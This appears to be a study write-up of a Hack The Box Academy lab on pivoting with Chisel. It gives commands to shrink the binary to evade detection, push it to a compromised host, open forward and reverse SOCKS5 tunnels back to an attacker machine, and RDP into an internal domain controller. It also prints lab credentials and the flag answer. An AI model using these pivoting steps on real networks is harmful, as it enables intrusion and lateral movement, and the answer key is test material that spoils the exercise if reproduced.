# SOCKS5 Tunneling with Chisel
[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0/23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

## Setting Up & Using Chisel
### Installing Chisel

```sh
$ go install github.com/jpillora/chisel@latest
```

> Note: If the latest version does not work, try other versions (.e.g. v1.10.1)

### Shrinking binary size
It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. 

```sh
masterofblafu@htb[~/go/bin/chisel]$ du -hs chisel 
10M     chisel
masterofblafu@htb[~/go/bin/chisel]$ go build -ldflags="-s -w"
masterofblafu@htb[~/go/bin/chisel]$ du -hs chisel 
7.5M     chisel
masterofblafu@htb[~/go/bin/chisel]$ upx brute chisel
masterofblafu@htb[~/go/bin/chisel]$ du -hs chisel 
2.9M     chisel
```

### Transferring Chisel Binary to Pivot Host
Once the binary is built, we can use `scp` to transfer it to the target pivot host.

```sh
masterofblafu@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09
```

### Running the Chisel Server on the Pivot Host
Then we can start the Chisel server/listener.

```sh
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host.

### Connecting to the Chisel Server

```sh
masterofblafu@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the `1080` port and the SSH tunnel.

### Editing & Confirming proxychains.conf

```sh
masterofblafu@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```

### Pivoting to the DC
Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```sh
masterofblafu@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot
In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (`1080`) and terminate the connection at the client's internal SOCKS5 proxy.

### Starting the Chisel Server on our Attack Host

```sh
masterofblafu@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

### Connecting the Chisel Client to our Attack Host

```sh
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

### Editing & Confirming proxychains.conf

```sh
masterofblafu@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```sh
masterofblafu@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Questions
SSH to **10.129.7.110** (ACADEMY-PIVOTING-LINUXPIV), with user `ubuntu` and password `HTB_@cademy_stdnt!`
1. Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer. **Answer: Th3\$eTunne1\$@rent8oring!**
   - Install chisel on the attack host and start the Chisel Server:
        ```sh
        $ go install github.com/jpillora/chisel@v1.10.1
        $ cd ~/go/bin
        $ chisel server --reverse -v -p 1234 --socks5
        ```
   - Copy chisel to the target pivot host and connect the Chisel Client to our Attack Host:
        ```sh
        $ scp ~/go/bin/chisel ubuntu@10.129.7.110:/home/ubuntu
        # At pivot host
        $ chmod +x chisel
        $ ./chisel client -v 10.10.15.159 R:socks
        ```
   - Edit the `/etc/proxychains.conf` to specify the default socks port:
        ```sh
        # At attack host
        $ tail -4 /etc/proxychains.conf
        # meanwile
        # defaults set to "tor"
        # socks4 	127.0.0.1 9050
        socks5 127.0.0.1 1080
        ```
   - `$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123` → RDP to the DC and read the flag at `C:\Users\victor\Documents\flag.txt`